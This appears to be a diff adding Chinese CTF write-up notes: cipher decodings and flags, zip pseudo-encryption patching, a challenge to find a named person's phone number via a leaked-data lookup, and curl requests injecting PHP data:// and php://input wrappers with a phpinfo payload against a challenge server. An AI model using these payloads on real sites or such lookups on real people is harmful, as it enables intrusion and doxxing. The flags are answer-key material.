@@ -1170,3 +1170,75 @@ Flag: flag{bugku--daimasj-a2}
 base91 编码
 用 ctf011.py 解码
 flag{554a5058c9021c76}
+
+
+==============================
+托马斯.杰斐逊
+==============================
+转盘编码
+用 ctf012.py 解码
+得到XSXSBUGKUADMIN 
+小写
+
+
+==============================
+这不是md5
+==============================
+简单ascii 码，用ctf013.py 解码
+
+
+==============================
+告诉你个秘密(ISCCCTF)
+==============================
+
+用ctf009.py 输出 
+r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM
+
+键盘码：
+t o n g y u a n
+大写
+TONGYUAN
+
+=============================
+眼见非实(ISCCCTF)
+=============================
+用zip打开文件，查看 document.xml
+flag{F1@g}
+
+=============================
+简单个人信息收集
+=============================
+1.zip 伪加密 找到 50 4B 01 02 之后的 09 改为 0
+
+在哈尔滨市阿城区胜利街六委十三组	有个叫杜甫的你能把他的手机号找到吗？
+
+flag格式  flag{手机号}
+
+使用社工库
+
+
+===================================
+===================================
+
+flag 的 base64 编码 ZmxhZw==
+
+尝试1：
+curl -i -d "I'm Administrator!" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=php://input&d=base64"
+
+返回
+hello admin!<br>
+
+尝试2：
+curl -i -d "I'm Administrator!" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=php://input&d=s:3:'123';base64&c=Flag.php"
+
+返回
+hello admin!<br>No! you can't use it!1
+
+尝试3：
+data://text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg==
+data:text/plaintext,<?php phpinfo();?>
+
+
+curl -i -d "I'm Administrator!" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=php://input&d=s:3:'123';base64&c=data://text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg=="
+
+hello admin!<br>big hacker ? Please get out! (╯‵□′)╯︵┻━┻
